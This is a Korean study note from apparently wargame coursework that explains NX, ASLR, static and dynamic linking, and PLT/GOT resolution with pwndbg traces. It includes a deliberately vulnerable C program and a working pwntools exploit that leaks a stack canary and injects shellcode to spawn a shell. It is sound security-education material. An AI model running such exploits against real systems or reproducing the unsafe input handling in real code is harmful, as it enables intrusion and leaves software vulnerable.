# NX & ASLR 우회

# NX & ASLR

## NX

---

### NX란?

**No eXecute (NX)** : 실행 권한을 가진 메모리와 쓰기 권한을 가진 메모리를 분리하는 보호 기법

어떤 메모리 영역에 쓰기 권한과 실행 권한이 함께 있으면 시스템이 취약해질 수 있다.
코드 영역에 쓰기 권한이 있다면 코드를 수정하여 코드가 실행되게 할 수 있다.
스택이나 데이터 영역에 실행 권한이 있다면 쉘코드를 해당 영역에 입력한 후 쉘코드가 실행되게 할 수 있다.

### Checksec을 이용한 NX 확인

checksec 명령을 이용하여 바이너리에 NX가 적용되었는지 확인 할 수 있다.
NX 뿐만 아니라 다른 보호 기법들이 적용되었는지도 확인 가능

```python
[*] '/home/dong/dreamhack/NX_ASLR/r2s'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

NX는 다양한 명칭들이 있다.
AMD : NX
인텔 : XD (eXecutable Disable)
윈도우 : DEP (Data Execution Prevention)
ARM : XN (eXecute Never)

현재는 NX를 비활성화 하면 stack 영역에만 실행 권한을 부여하지만, 5.4.0 미만 버전의 리눅스 커널에서는 읽기 권한이 있는 모든 페이지에 실행권한을 부여했었다.
→ 더 보안적인 취약점이 컸음

## NX 컴파일 테스트

---

NX를 적용한 프로그램과 NX를 적용하지 않은 프로그램을 비교해보자.
NX를 비활성화하는 옵션은 -zexecstack 이다.

### r2s 코드

buf의 크기는 0x50이지만 0x100 크기를 입력받으므로 스택 버퍼 오버플로우 취약점이 발생한다.

```c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x50];

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

### Exploit.py

버퍼에 쉘코드를 입력함과 동시에 반환 주소를 쉘코드의 주소로 조작하는 방식으로 쉘을 획득한다.

```python
#!/usr/bin/env python3
# Name: r2s.py
from pwn import *

# success : pwntool 내장함수로 [+] 접두사가 붙어 터미널에 표시된다.
# 출력: [+] shell gained!
def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./r2s')

context.arch = 'amd64'

# [1] Get information about buf
# p.recvuntil(b'buf: ') buf까지 버림
# buf = int(p.recvline()[:-1], 16) 마지막 개행을 버리기 위해서 [:-1]로 슬라이싱, 16진수
p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('Address of buf', buf)

# buf2sfp = int(p.recvline().split()[0])
#  96 bytes와 같이 출력되었을 때 숫자만 뽑기 위해서 split 함수로 나누고 0번째 인덱스 저장
p.recvuntil(b'$rbp: ')
buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp - 8
slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2cnry)

# [2] Leak canary value
payload = b'A' * (buf2cnry + 1) # (+1) because of the first null-byte

p.sendafter(b'Input:', payload)
p.recvuntil(payload)
cnry = u64(b'\x00' + p.recvn(7))
slog('Canary', cnry)

# [3] Exploit
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b'A') + p64(cnry) + b'B'*0x8 + p64(buf)
# gets() receives input until '\n' is received
p.sendlineafter(b'Input:', payload)

p.interactive()
```

NX가 적용되지 않은 프로그램의 경우 익스플로잇이 된다.
NX가 적용된 프로그램의 경우 Segmentation fault (SIGSEGV)가 발생하며 익스플로잇에 실패한다.
NX가 적용되어 스택 영역에 실행 권한이 사라지게 되면서, 쉘코드가 실행되지 못 하고 종료된 원리이다.

## ASLR

---

### ASLR이란?

**Address Space Layout Randomization (ASLR)** : 바이너리가 실행될 때마다 스택, 힙, 공유 라이브러리 등을 임의의 주소에 할당하는 보호 기법

ASLR은 커널에서 지원하는 보호 기법이며, 다음의 명령으로 확인할 수 있다.

```c
$ cat /proc/sys/kernel/randomize_va_space
2
```

리눅스에서 이 값은 0, 1, 2의 값을 가질 수 있다. 각 ASLR이 적용되는 메모리 영역은 다음과 같다.

- No ASLR(0): ASLR을 적용하지 않음
- Conservative Randomization(1): 스택, 라이브러리, vdso 등
- Conservative Randomization + brk(2): (1)의 영역과 brk로 할당한 영역

## ASLR의 특징

---

아래의 코드로 ASLR의 특징을 알 수 있다.

```c
// Name: addr.c
// Compile: gcc addr.c -o addr -ldl -no-pie -fno-PIE

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
  char buf_stack[0x10];                   // 스택 버퍼
  char *buf_heap = (char *)malloc(0x10);  // 힙 버퍼

  printf("buf_stack addr: %p\n", buf_stack);
  printf("buf_heap addr: %p\n", buf_heap);
  printf("libc_base addr: %p\n",
         *(void **)dlopen("libc.so.6", RTLD_LAZY));  // 라이브러리 주소

  printf("printf addr: %p\n",
         dlsym(dlopen("libc.so.6", RTLD_LAZY),
               "printf"));  // 라이브러리 함수의 주소
  printf("main addr: %p\n", main);  // 코드 영역의 함수 주소
}
```

실행 결과

```c
dong@BOOK-52INSEHGSS:~/dreamhack/NX_ASLR$ addr
buf_stack addr: 0x7ffcb7053be0
buf_heap addr: 0x154bc2a0
libc_base addr: 0x7a524a400000
printf addr: 0x7a524a460100
main addr: 0x4011b6

dong@BOOK-52INSEHGSS:~/dreamhack/NX_ASLR$ addr
buf_stack addr: 0x7ffeb93cac60
buf_heap addr: 0xd4472a0
libc_base addr: 0x77dbbc400000
printf addr: 0x77dbbc460100
main addr: 0x4011b6

dong@BOOK-52INSEHGSS:~/dreamhack/NX_ASLR$ addr
buf_stack addr: 0x7ffe7e6b4c30
buf_heap addr: 0x217872a0
libc_base addr: 0x7e4d91c00000
printf addr: 0x7e4d91c60100
main addr: 0x4011b6

//ASLR이 적용되지 않았을 때의 결과
buf_stack addr: 0x7fffffffdf80
buf_heap addr: 0x4052a0
libc_base addr: 0x7ffff7c00000
printf addr: 0x7ffff7c60100
main addr: 0x4011b6
```

스택 영역 : buf_stack
힙 영역 : buf_heap 
라이브러리 함수 : printf - 하위 12 비트 일정
코드 영역의 함수 : main - 주소 일정
라이브러리 매핑 주소 : libc_base - 하위 12 비트 일정

- 코드 영역의 main 함수는 주소가 항상 동일하다.
- main 함수를 제외한 다른 함수들의 주소는 실행할 때마다 변경된다.
- libc_base의 하위 12 비트 값과 printf의 하위 12 비트 값은 변경되지 않는다.
리눅스는 ASLR이 적용되었을 때, 페이지(page) 단위로 임의 주소에 매핑하므로, 페이지의 크기인 12 비트 이하로는 주소가 변경되지 않는다.
- libc_base와 printf의 주소 차이는 항상 같다.

컴퓨터에서 메모리는 2^64 즉 16EB(엑사 바이트)에 해당하는 주소들을 다룰 수 있다. 
따라서 메모리 할당을 바이트 단위로 하면 너무 많은 할당이 필요하므로 4KB = 4096B, 2^12 크기의 페이지 단위로 임의 주소에 할당한다. 
따라서 하위 12비트는 000으로 변할 수 없다.

실제로 확인해보았을 때 21비트에 해당하는 주소가 변하지 않았다.
왜냐하면 실제로는 libc 같은 큰 라이브러리를 매핑할 때 2MB(2^21) 경계에 정렬해서 올리기 때문이다.

printf의 경우 libc_base에서 offset(60100)만큼 떨어진 부분에 있는 함수이므로 libc_base의 주소가 정해지면 그에 해당하는 주소에서 offset만큼의 거리만큼 추가되어 printf의 주소가 정해진다.

# Background: Library -Static Link vs. Dynamic Link

## 라이브러리

---

### 라이브러리란?

라이브러리는 컴퓨터 시스템에서, 프로그램들이 함수나, 변수를 공유해서 사용할 수 있게 한다.
C언어를 비롯한 많은 컴파일 언어들은 주로 사용되는 함수들의 정의를 묶어서 하나의 라이브러리 파일로 만들고, 이를 프로그램이 공유해서 사용할 수 있도록 지원한다.
C의 표준 라이브러리인 **libc(library C)**는 우분투에 기본으로 탑재된 라이브러리이며, 실습환경에서는 /lib/x86_64-linux-gnu/libc.so.6 에 있다.

## 링크

---

### 링크란?

프로그램에서 어떤 라이브러리의 함수를 사용한다면, 호출된 함수와 실제 라이브러리의 함수가 링크 과정에서 연결된다. 

```c
// Name: hello-world.c
// Compile: gcc -o hello-world hello-world.c

#include <stdio.h>

int main() {
  puts("Hello, world!");
  return 0;
}
```

```c
// Path: /usr/include/stdio.h

...
/* Write a string, followed by a newline, to stdout.

   This function is a possible cancellation point and therefore not
   marked with __THROW.  */
extern int puts (const char *__s);
...
```

리눅스에서 C 소스 코드는 전처리, 컴파일, 어셈블 과정을 거쳐 ELF 형식을 갖춘 오브젝트 파일로 번역된다.
오브젝트 파일은 실행 가능한 형식을 갖추고 있지만, 라이브러리 함수들의 정의가 어디 있는지 알지 못하므로 실행은 불가능하다. (물론 라이브러리 함수가 없다고 오브젝트 파일을 실행할 수 있는 것은 아니다.)

다음 명령어를 실행해보면, puts의 선언이 stdio.h에 있어서 심볼(symbol)로는 기록되어 있지만, 심볼에 대한 자세한 내용은 하나도 기록되어 있지 않다. 심볼과 관련된 정보들을 찾아서 최종 실행 파일에 기록하는 것이 링크 과정에서 하는 일 중 하나이다.

```c
// readelf는 ELF 파일(바이너리, 오브젝트 파일, 라이브러리)의 내부정보를 읽어준다.
// -s 옵션은 심볼 테이블을 보여준다.
$ readelf -s hello-world.o | grep puts
    11: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND puts
```

우리가 만든 프로그램에서는 puts함수를 사용하기 위해 stdio.h라는 헤더파일을 집어넣었다.
프로그램에서 puts를 쓰려면 컴파일러가 puts가 어떤 인자를 받고 무엇을 반환하는지 정도만 알아도  된다.
→ puts 함수로 이동하기 전에 인자를 전달하고 함수가 끝난 후 반환값을 받기만 하면 된다.
→ 함수의 구체적인 동작은 라이브러리에 정의되어 있다.
따라서 헤더 파일에는 함수의 정의는 존재하지 않고 선언만이 존재한다.
만약 헤더에 선언과 정의가 함께 들어갔다면 두 파일을 동시에 컴파일하여 링크할 때 문제가 발생할 수 있다.
→ 두 오브젝트 링커가 합쳐질 때, puts 정의가 두 개가 존재하므로 multiple definition 링크 에러가 난다.

```c
$ gcc -o hello-world hello-world.c
// readelf는 ELF 파일(바이너리, 오브젝트 파일, 라이브러리)의 내부정보를 읽어준다.
// -s 옵션은 심볼 테이블을 보여준다.
$ readelf -s hello-world | grep puts
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
    46: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5
// ldd는 바이너리가 어떤 공유 라이브러리에 의존하는지 보여준다.
$ ldd hello-world
        linux-vdso.so.1 (0x00007ffec3995000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fee37831000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fee37e24000)
```

위와 같이 hello-world 프로그램을 완전히 컴파일하면, puts함수가 libc와 연결된 것을 볼 수 있다.
여기서 libc를 같이 컴파일 하지 않았음에도 libc에서 해당 심볼을 탐색한 것은, libc가 있는 /libc/x86_64-linux-gnu/ 가 표준 라이브러리 경로에 포함되어 있기 때문이다.

아래 명령어를 통해 표준 라이브러리의 경로를 확인 할 수 있다.

```c
$ ld --verbose | grep SEARCH_DIR | tr -s ' ;' '\n'
SEARCH_DIR("=/usr/local/lib/x86_64-linux-gnu")
SEARCH_DIR("=/lib/x86_64-linux-gnu")
SEARCH_DIR("=/usr/lib/x86_64-linux-gnu")
SEARCH_DIR("=/usr/lib/x86_64-linux-gnu64")
SEARCH_DIR("=/usr/local/lib64")
SEARCH_DIR("=/lib64")
SEARCH_DIR("=/usr/lib64")
SEARCH_DIR("=/usr/local/lib")
SEARCH_DIR("=/lib")
SEARCH_DIR("=/usr/lib")
SEARCH_DIR("=/usr/x86_64-linux-gnu/lib64")
SEARCH_DIR("=/usr/x86_64-linux-gnu/lib")
```

## 라이브러리와 링크의 종류

---

라이브러리는 크게 동적 라이브러리와 정적 라이브러리로 구분되며, 동적 라이브러리를 링크하는 것을 동적 링크 (Dynamic Link), 정적 라이브러리를 링크하는 것을 (Static Link)라고 부른다.

### 동적 링크

동적 링크는 위에서 본 것과 같이 라이브러리 함수를 바이너리에 넣지 않고, 실행할 때 libc.so를 메모리에 올려서 연결한다.

### 정적 링크

정적 링크는 컴파일 할 때 라이브러리 함수를 바이너리에 복사해서 넣는다. 따라서 실행할 때 외부 라이브러리가 필요하지 않다.

### 동적 링크 vs. 정적 링크

실제로 확인해보기

```c
$ gcc -o static hello-world.c -static
$ gcc -o dynamic hello-world.c -no-pie
```

**용량**을 비교해보면 static이 dynamic보다 더 많은 용량을 차지하는 것을 알 수 있다.

```c
$ ls -lh ./static ./dynamic
-rwxrwxr-x 1 dreamhack dreamhack  16K May 22 02:01 ./dynamic
-rwxrwxr-x 1 dreamhack dreamhack 880K May 22 02:01 ./static
```

**호출 방법**
static의 경우 puts가 있는 0x40c140을 직접 호출한다.
dynamic의 경우 puts의 plt 주소인 0x401040을 호출한다. 동적 링크된 바이너리는 함수의 주소를 라이브러리에서 찾아야 하고, **plt**는 이 과정에서 사용되는 테이블이다.
plt는 아래서 더 자세히 다룬다.

```c
 //static
 main:
  push   rbp
  mov    rbp,rsp
  lea    rax,[rip+0x96880] # 0x498004
  mov    rdi,rax
  call   0x40c140 <puts>
  mov    eax,0x0
  pop    rbp
  ret

//dynamic
main: 
 push   rbp
 mov    rbp,rsp
 lea    rdi,[rip+0xebf] # 0x402004
 mov    rdi,rax
 call   0x401040 <puts@plt>
 mov    eax,0x0
 pop    rbp
 ret
```

## PLT & GOT

---

### PLT와 GOT

**PLT(Procedure Linkage Table)**와 **GOT(Global Offset Table)**는 라이브러리에서 동적 링크된 심볼의 주소를 찾을 때 사용하는 테이블이다.

바이너리가 실행되면 ASLR에 의해 라이브러리가 임의의 주소에 매핑된다.
이 상태에서 라이브러리 함수를 호출하면, 함수의 이름을 바탕으로 라이브러리에서 심볼들을 탐색하고, 해당 함수의 정의를 발견하면 그 주소로 실행 흐름을 옮기게 된다.
이 전 과정을 통틀어 runtime resolve라고 한다.

함수의 정의를 매번 탐색하는 것은 비효율적이므로 ELF는 GOT라는 테이블을 두고, resolve된 함수의 주소를 해당 테이블에 저장한다.

아래 예제를 통해서 실제 바이너리 동작을 확인해보자.

```c
// Name: got.c
// Compile: gcc -o got got.c -no-pie

#include <stdio.h>

int main() {
  puts("Resolving address of 'puts'.");
  puts("Get address from GOT");
}
```

**resolve 되기전**

got 명령을 통해서 GOT의 상태를 볼 수 있다.
plt 명령을 통해서 PLT의 상태를 볼 수 있다.

```c
dong@BOOK-52INSEHGSS:~/dreamhack/NX_ASLR/library$ gdb got
pwndbg> entry
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/dong/dreamhack/NX_ASLR/library/got:
GOT protection: Partial RELRO | Found 1 GOT entries passing the filter
[0x404000] puts@GLIBC_2.2.5 -> 0x401030 ◂— endbr64
pwndbg> plt
Section .plt 0x401020 - 0x401040:
No symbols found in section .plt
Section .plt.sec 0x401040 - 0x401050:
0x401040: puts@plt
```

main함수에서 puts 함수를 호출하는 지점에 중단점을 설정하고, 내부로 따라가보자.

```c
pwndbg> b *main+18
Breakpoint 1 at 0x401148
pwndbg> c
Continuing.
...
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
b► 0x401148 <main+18>    call   puts@plt                    <puts@plt>
        s: 0x402004 ◂— "Resolving address of 'puts'."

...
pwndbg> si
...
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x401040       <puts@plt>                        endbr64
   0x401044       <puts@plt+4>                      jmp    qword ptr [rip + 0x2fb6]    <0x401030>
    ↓
   0x401030                                         endbr64
   0x401034                                         push   0
   0x401039                                         jmp    0x401020                    <0x401020>
    ↓
   0x401020                                         push   qword ptr [rip + 0x2fca]
   0x401026                                         jmp    qword ptr [rip + 0x2fcc]    <_dl_runtime_resolve_xsavec>
    ↓
   0x7ffff7fda2f0 <_dl_runtime_resolve_xsavec>      endbr64
   0x7ffff7fda2f4 <_dl_runtime_resolve_xsavec+4>    push   rbx
   0x7ffff7fda2f5 <_dl_runtime_resolve_xsavec+5>    mov    rbx, rsp                    RBX => 0x7fffffffdf10 —▸ 0x7fffffffe058 —▸ 0x7fffffffe2e7 ◂— ...
   0x7ffff7fda2f8 <_dl_runtime_resolve_xsavec+8>    and    rsp, 0xffffffffffffffc0     RSP => 0x7fffffffdf00 (0x7fffffffdf10 & -0x40)
```

puts@plt를 호출하면 .plt.sec에 있던 0x401040으로 호출을 옮긴다.
이후 puts의 GOT 엔트리에 쓰인 값인 0x401030으로 호출을 옮긴다.
실행 흐름을 따라가다 보면 _dl_runtime_resolve_xsavec라는 함수가 실행되는데, 이 함수에서 puts의 주소가 구해지고, GOT 엔트리에 주소를 쓴다.

**resolve된 후**

puts@plt를 두번째로 호출할 때는 puts의 GOT 엔트리에 실제 puts 주소인 0x7ffff7c87be0가 쓰여 있어서 바로 puts가 실행된다.

```c
pwndbg> b *main+33
Breakpoint 2 at 0x401157
pwndbg> c
Continuing.
...
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
b+ 0x401148 <main+18>    call   puts@plt                    <puts@plt>

   0x40114d <main+23>    lea    rax, [rip + 0xecd]     RAX => 0x402021 ◂— 'Get address from GOT'
   0x401154 <main+30>    mov    rdi, rax               RDI => 0x402021 ◂— 'Get address from GOT'
b► 0x401157 <main+33>    call   puts@plt                    <puts@plt>
        s: 0x402021 ◂— 'Get address from GOT'
...
pwndbg> si
...
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x401040       <puts@plt>      endbr64
   0x401044       <puts@plt+4>    jmp    qword ptr [rip + 0x2fb6]    <puts>
    ↓
   0x7ffff7c87be0 <puts>          endbr64
   0x7ffff7c87be4 <puts+4>        push   rbp
   0x7ffff7c87be5 <puts+5>        mov    rbp, rsp     RBP => 0x7fffffffdf20 —▸ 0x7fffffffdf30 —▸ 0x7fffffffdfd0 —▸ 0x7fffffffe030 ◂— ...
   0x7ffff7c87be8 <puts+8>        push   r15
   0x7ffff7c87bea <puts+10>       push   r14
   0x7ffff7c87bec <puts+12>       push   r13
   0x7ffff7c87bee <puts+14>       push   r12
   0x7ffff7c87bf0 <puts+16>       mov    r12, rdi     R12 => 0x402021 ◂— 'Get address from GOT'
   0x7ffff7c87bf3 <puts+19>       push   rbx
...
```

### 실제 흐름

1. call puts → .plt.sec의 0x401040으로 점프
2. jmp [0x404000] → GOT에서 값(0x401030)을 읽음
3. 0x401030으로 점프 → .plt 섹션의 코드
4. push 0; jmp 0x401020 → 동적 링커 호출

드림핵 강좌에서는 call puts를 만났을 때 바로 .plt 섹션으로 이동한 뒤 .plt 섹션에 저장되어 있는 GOT에 저장된 값을 읽어 다시 점프 한다고 했는데 이러면 회귀적으로 다시 점프되므로 문제가 발생한다.

실제로는 .plt.sec으로 먼저 이동한 뒤 .plt로 이동하여 문제를 해결한다.

.plt.sec 섹션 : 프로그램이 라이브러리 함수를 호출할 때 매번 거치는 곳으로, GOT에서 주소를 읽어 점프한다.
.plt 섹션 : 첫 호출할 때만 거치는 곳으로, 찾을 함수 번호를 push로 스택에 넣고, 동적 링커로 점프한다.
.got.plt 섹션 : 함수의 실제 주소를 저장하는 데이터 칸이다.

## 시스템 해킹 관점에서 본 PLT와 GOT

---

PLT에서 GOT를 참조하여 실행 흐름을 옮길 때, GOT의 값을 검증하지 않는다는 보안상의 약점이 있다.
따라서 만약 앞의 예에서 puts의 GOT 엔트리에 저장된 값을 공격자가 임의로 변경할 수 있으면, puts가 호출될 때 공격자가 원하는 코드가 실행되게 할 수 있다.

GOT 엔트리에 임의의 값을 오버라이트(Overwrite)하여 실행 흐름을 변조하는 공격 기법을 GOT Overwrite라고 부른다. 일반적으로 임의 주소에 임의의 값을 오버라이트하는 수단을 가지고 있을 때 수행하는 공격기법이다.

## 실습

---

[Exploit Tech: Return to Library](https://www.notion.so/Exploit-Tech-Return-to-Library-35ca9179d3af8071bb8dde7396123912?pvs=21)

[Exploit Tech: Return Oriented Programming](https://www.notion.so/Exploit-Tech-Return-Oriented-Programming-35ca9179d3af807189c0e3333c8a4754?pvs=21)

[Exploit Tech: ROP x64](https://www.notion.so/Exploit-Tech-ROP-x64-35ca9179d3af803a9b82eb289d6b62d1?pvs=21)

[Exploit Tech: ROP x86](https://www.notion.so/Exploit-Tech-ROP-x86-35ca9179d3af80ec8383c1fd901573d2?pvs=21)